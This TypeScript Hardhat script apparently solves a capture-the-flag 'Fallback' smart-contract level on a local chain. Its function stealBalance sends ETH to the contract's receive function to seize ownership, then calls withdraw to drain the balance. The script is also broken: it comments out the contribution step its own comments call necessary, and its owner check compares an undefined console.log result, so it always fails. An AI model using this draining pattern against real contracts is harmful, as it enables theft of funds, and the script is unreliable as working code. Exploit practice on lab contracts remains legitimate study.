import { ethers } from "hardhat";
import fallback_deployment from "../deployments/localhost/Fallback_implementation.json";
import { Fallback } from "../typechain-types/Fallback";
import { Fallback__factory } from "../typechain-types/factories/Fallback__factory";
import { MinEthersFactory } from "../typechain-types/common";
import * as hre from '@nomiclabs/hardhat-ethers';

async function stealBalance(signer: ethers.SignerWithAddress, contract: Fallback) {
    // We need to send a contribution to the contract
    contract = contract.connect(signer);
    
    // await contract.contribute({
    //     gasLimit: 2000000,
    //     //value: ethers.utils.parseEther('0.001').toString()
    //     value: '1000000000'
    //     //value: hardhat.ethers.utils.parseUnits("1", "ether")
    // });

    // Then we need to simply send ETH to contract, triggering the receive function
    const tx = {
        to: contract.address,
        value: ethers.utils.parseEther("0.0001")
    };
    const transaction = await signer.sendTransaction(tx);
    // We check we are the owner
    const newOwner = console.log('owner', await contract.owner());
    if (newOwner!== signer.address){
        throw new Error("Owner not changed");
        
    }

    // We empty the contract.
    await contract.withdraw();
    const balance = await ethers.provider.getBalance(fallback_deployment.address);
    console.log('balance', balance.toString());
}

async function mainLocal() {
    const fallback = await ethers.getContractFactory("Fallback");
    const fallbackLevelAddress = "0xBA87c68C07745771b5AB34Da7edd84a6c7711908";

    //let contract = await fallback.attach(fallbackLevelAddress) as Fallback;


    const [deployer] = await ethers.getSigners();
    console.log('deployer', deployer.address);

    const MyContract = await ethers.getContractFactory("Fallback");
    const contract = await MyContract.attach(fallbackLevelAddress) as Fallback;

    console.log('owner', await contract.owner());

    await stealBalance(deployer, contract);

}

mainLocal().catch((error) => {
    console.error(error);
    process.exit(1);
});